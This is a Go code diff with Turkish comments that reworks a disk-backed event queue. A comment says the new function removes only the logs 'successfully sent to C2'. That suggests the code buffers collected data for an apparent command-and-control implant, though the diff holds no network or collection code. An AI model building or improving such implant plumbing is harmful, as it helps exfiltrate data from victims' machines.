@@ -32,6 +32,7 @@ func EnqueueEvent(e Event) error {
 	return nil
 }
 
+// DequeueAll diskteki tüm olayları okur
 func DequeueAll() ([]Event, error) {
 	queueMutex.Lock()
 	defer queueMutex.Unlock()
@@ -53,11 +54,61 @@ func DequeueAll() ([]Event, error) {
 			events = append(events, e)
 		}
 	}
+
+	// Buradaki scanner.Err() linter'ı memnun eder
 	return events, scanner.Err()
 }
 
-func ClearQueue() error {
+// RemoveProcessedEvents sadece C2'ye başarıyla gönderilen logları dosyadan siler.
+// Eğer o sırada yeni loglar gelmişse onları korur (Race Condition engeli).
+func RemoveProcessedEvents(processedCount int) error {
 	queueMutex.Lock()
 	defer queueMutex.Unlock()
-	return os.Remove(queueFile)
+
+	var remainingEvents []Event
+	file, err := os.Open(queueFile)
+	if err != nil {
+		if os.IsNotExist(err) {
+			return nil
+		}
+		return err
+	}
+
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		var e Event
+		if err := json.Unmarshal(scanner.Bytes(), &e); err == nil {
+			remainingEvents = append(remainingEvents, e)
+		}
+	}
+
+	// LİNTER DÜZELTMESİ: Okuma bittikten sonra hata var mı diye kontrol ediyoruz
+	if err := scanner.Err(); err != nil {
+		file.Close()
+		return err
+	}
+	file.Close()
+
+	// Eğer dosyaya yeni bir veri eklenmemişse, doğrudan dosyayı sil
+	if processedCount >= len(remainingEvents) {
+		return os.Remove(queueFile)
+	}
+
+	// Dosyaya yeni veri eklenmişse gönderilenleri kes at, kalanları tut
+	remainingEvents = remainingEvents[processedCount:]
+
+	// Dosyayı tamamen sıfırla ve sadece KALAN verileri yeniden yaz
+	file, err = os.OpenFile(queueFile, os.O_TRUNC|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+
+	for _, e := range remainingEvents {
+		data, _ := json.Marshal(e)
+		file.Write(data)
+		file.WriteString("\n")
+	}
+
+	return nil
 }
